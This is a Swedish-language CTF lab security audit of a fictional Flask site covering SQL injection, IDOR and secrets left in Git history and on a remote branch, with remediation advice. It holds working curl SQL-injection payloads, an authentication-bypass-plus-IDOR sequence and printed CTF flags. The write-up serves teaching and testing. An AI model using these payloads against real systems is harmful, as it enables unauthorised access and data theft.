# Säkerhetsgranskning av company-website

## Sammanfattning

Granskningen identifierade fyra säkerhetsproblem i den fiktiva webbapplikationen `company-website`: SQL-injektion i inloggningen, bristande åtkomstkontroll för användarprofiler samt två fall där känslig information kan hämtas från Git-historik eller en remote-branch.

Testerna genomfördes inom den auktoriserade CTF-labbmiljön. Webbtesterna är avgränsade till `http://10.0.3.3/`. Inga applikationsfiler eller databasposter ändrades under verifieringen.

## Omfattning

- Flask-applikationens Python-kod och HTML-mallar
- SQLite-migrationer och seed-data
- Git-historik och remote-branches
- Docker-, Kubernetes- och GitHub Actions-konfiguration

## Fynd 1: SQL-injektion i inloggningen

**Allvarlighetsgrad:** Kritisk  
**Endpoint:** `POST /login`  
**Relevant kod:** `src/company_website/auth.py`, funktionen `login()`

### Beskrivning

Användarnamn och lösenord läggs direkt i en SQL-sträng. En angripare kan därför ändra databasfrågan, kringgå autentiseringen och läsa data ur databasen. Flaggan lagras i kolumnen `password_hash` för användaren `flag`.

### Verifiering

```bash
curl -sS -X POST 'http://10.0.3.3/login' \
  --data-urlencode "username=' UNION SELECT 1,password_hash,'x',NULL,NULL,NULL,NULL,NULL,NULL FROM users WHERE username='flag' -- " \
  --data-urlencode 'password=x' |
grep -o 'ITSX25{[^}]*}'
```

### Rekommenderad åtgärd

Använd en parametriserad SQL-fråga för uppslagning av användaren och kontrollera därefter lösenordet med `check_password_hash`. Returnera inte databasfel till klienten.

## Fynd 2: Bristande åtkomstkontroll för profiler (IDOR)

**Allvarlighetsgrad:** Hög  
**Endpoint:** `GET/POST /profiles/<id>/edit`  
**Relevant kod:** `src/company_website/routes.py`, funktionen `edit_profile()`

### Beskrivning

Routen kräver inloggning men kontrollerar inte att profilens ID tillhör den inloggade användaren. En användare kan därför läsa och ändra en annan användares profil och privata `internal_notes`. Bobs profil, ID 4, innehåller CTF-flaggan.

### Verifiering

```bash
curl -sS -c /tmp/ctf-cookies \
  -X POST 'http://10.0.3.3/login' \
  --data-urlencode "username=' OR username='dev' -- " \
  --data-urlencode 'password=x' \
  -o /dev/null

curl -sS -b /tmp/ctf-cookies \
  'http://10.0.3.3/profiles/4/edit' |
grep -o 'ITSX25{[^}]*}'
```

### Rekommenderad åtgärd

Kontrollera att `str(current_user.id) == str(id)` innan profilen läses eller ändras. Returnera HTTP 403 när användaren saknar behörighet. Lägg även till CSRF-skydd för ändringsformuläret.

## Fynd 3: Känslig information finns kvar i Git-historiken

**Allvarlighetsgrad:** Hög  
**Relevant fil:** `flag.txt` i commit `f55b82d`

### Beskrivning

En känslig fil har tagits bort från den aktuella versionen men finns fortfarande kvar i Git-historiken. Att radera en fil i en senare commit tar inte bort äldre kopior.

### Verifiering

```bash
git show f55b82d:flag.txt
```

Observerad CTF-flagga:

```text
ITSX25{g1t_n3v3r_f0rg3t5_y0ur_m1st4k3s}
```

### Rekommenderad åtgärd

Rotera alltid exponerade hemligheter. Rensa historiken med ett lämpligt verktyg, exempelvis `git filter-repo`, och uppdatera remote-repot enligt organisationens rutin.

## Fynd 4: Känslig information på remote-branch

**Allvarlighetsgrad:** Hög  
**Branch:** `origin/chore/dependency-audit`  
**Relevant fil:** `flag.txt`

### Beskrivning

En fil med känslig information finns på en remote-branch som inte är utcheckad lokalt. Alla som kan läsa repot kan fortfarande läsa branchens innehåll.

### Verifiering

```bash
git show origin/chore/dependency-audit:flag.txt
```

Observerad CTF-flagga:

```text
ITSX25{th3_1nv1s1bl3_br4nch_0f_s3cr3ts}
```

### Rekommenderad åtgärd

Rotera exponerade hemligheter, ta bort filen från branchens historik och radera branchen om den inte längre behövs. Inför secret scanning och pre-commit-kontroller.

## Prioritering

1. Åtgärda SQL-injektionen och rotera exponerade uppgifter.
2. Lägg till ägarskapskontroll och CSRF-skydd för profilredigering.
3. Rensa känslig information från Git-historik och remote-branches.
4. Lägg till automatiska tester för autentisering och behörighetskontroll.

